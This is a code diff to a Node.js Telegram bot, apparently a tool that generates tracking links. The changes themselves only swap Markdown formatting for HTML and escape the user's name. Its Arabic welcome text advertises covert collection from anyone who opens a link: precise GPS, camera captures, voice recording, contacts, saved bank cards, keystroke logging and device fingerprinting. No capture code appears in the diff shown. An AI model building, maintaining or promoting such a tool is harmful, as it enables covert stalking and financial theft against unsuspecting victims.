@@ -1307,21 +1307,21 @@ bot.on('message', async (msg) => {
     const tr      = T[lang];
     const name    = msg.chat.first_name || '';
 
-    // ── Animated boot sequence ────────────────────────────────────────────────
+    // ── Animated boot sequence (HTML — safe with all emojis) ─────────────────
     const delay = ms => new Promise(r => setTimeout(r, ms));
     const bars  = ['▱▱▱▱▱▱▱▱▱▱','▰▱▱▱▱▱▱▱▱▱','▰▰▰▱▱▱▱▱▱▱','▰▰▰▰▰▱▱▱▱▱','▰▰▰▰▰▰▰▱▱▱','▰▰▰▰▰▰▰▰▰▰'];
     const steps = [
-      `⚡ *تهيئة النظام...*\n\n${bars[0]} 0%`,
-      `🔐 *تحقق من الهوية...*\n\n${bars[2]} 30%`,
-      `📡 *تحميل قاعدة البيانات...*\n\n${bars[3]} 50%`,
-      `🛰️ *تفعيل بروتوكولات التتبع...*\n\n${bars[4]} 70%`,
-      `🔗 *تجهيز محركات الروابط...*\n\n${bars[5]} 100%\n\n✅ *جاهز!*`,
+      `⚡ <b>تهيئة النظام...</b>\n\n${bars[0]} 0%`,
+      `🔐 <b>تحقق من الهوية...</b>\n\n${bars[2]} 30%`,
+      `📡 <b>تحميل قاعدة البيانات...</b>\n\n${bars[3]} 50%`,
+      `📡 <b>تفعيل بروتوكولات التتبع...</b>\n\n${bars[4]} 70%`,
+      `🔗 <b>تجهيز محركات الروابط...</b>\n\n${bars[5]} 100%\n\n✅ <b>جاهز!</b>`,
     ];
-    const bootMsg = await bot.sendMessage(chatId, steps[0], { parse_mode: 'Markdown' });
+    const bootMsg = await bot.sendMessage(chatId, steps[0], { parse_mode: 'HTML' });
     const mid = bootMsg.message_id;
     for (let i = 1; i < steps.length; i++) {
       await delay(600);
-      await bot.editMessageText(steps[i], { chat_id: chatId, message_id: mid, parse_mode: 'Markdown' }).catch(() => {});
+      await bot.editMessageText(steps[i], { chat_id: chatId, message_id: mid, parse_mode: 'HTML' }).catch(() => {});
     }
     await delay(700);
     await bot.deleteMessage(chatId, mid).catch(() => {});
@@ -1352,31 +1352,32 @@ bot.on('message', async (msg) => {
       [{ text: lang === 'ar' ? '🌐 English' : '🌐 العربية' }],
     ];
 
-    const badge   = isOwner ? '👑 مالك' : isPrem ? '💎 مميز' : '🆓 مجاني';
-    const welcome = settings.welcomeMsg || (
-      `${isNew ? `✨ أهلاً *${name}*! مرحباً بك للمرة الأولى 🎉` : `🔥 أهلاً مجدداً *${name}*! ⚡`}\n` +
+    const safeName = (name || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const badge    = isOwner ? '👑 مالك' : isPrem ? '💎 مميز' : '🆓 مجاني';
+    const welcome  = settings.welcomeMsg || (
+      `${isNew ? `✨ أهلاً <b>${safeName}</b>! مرحباً بك للمرة الأولى 🎉` : `🔥 أهلاً مجدداً <b>${safeName}</b>! ⚡`}\n` +
       `${badge}\n\n` +
       `━━━━━━━━━━━━━━━━━━━━\n` +
-      `🕵️ *بوت التتبع المتقدم*\n` +
+      `🔭 <b>بوت التتبع المتقدم</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━\n\n` +
-      `📡 *يجمع لحظة الفتح:*\n` +
+      `📡 <b>يجمع لحظة الفتح:</b>\n` +
       `📍 GPS دقيق + IP + المدينة\n` +
       `📱 بصمة الجهاز الكاملة\n` +
       `📷 كاميرا أمامية + خلفية\n` +
-      `🎙️ تسجيل صوتي\n` +
+      `🎙 تسجيل صوتي\n` +
       `📒 جهات الاتصال\n` +
       `💳 بطاقات البنك المحفوظة\n` +
-      `🔵 أجهزة Bluetooth\n` +
+      `🔵 أجهزة Bluetooth المقترنة\n` +
       `🌐 WebRTC IP الداخلي\n` +
-      `⌨️ تسجيل ما يكتبه\n` +
-      `👁️ مراقبة سلوك المستخدم\n` +
+      `⌨ تسجيل ما يكتبه\n` +
+      `👁 مراقبة سلوك المستخدم\n` +
       `🔤 الخطوط المثبّتة + GPU\n` +
       `🚪 مدة بقائه في الصفحة\n\n` +
       `⚡ Powered by @Ye_x00`
     );
 
     await bot.sendMessage(chatId, welcome, {
-      parse_mode: 'Markdown',
+      parse_mode: 'HTML',
       reply_markup: JSON.stringify({
         keyboard: replyKbRows,
         resize_keyboard: true,
@@ -1384,8 +1385,8 @@ bot.on('message', async (msg) => {
         input_field_placeholder: 'اختر من القائمة...'
       })
     });
-    return bot.sendMessage(chatId, '⚡ *اختر من القائمة:*', {
-      parse_mode: 'Markdown',
+    return bot.sendMessage(chatId, '⚡ <b>اختر من القائمة:</b>', {
+      parse_mode: 'HTML',
       reply_markup: JSON.stringify({ inline_keyboard: baseRows })
     });
   }
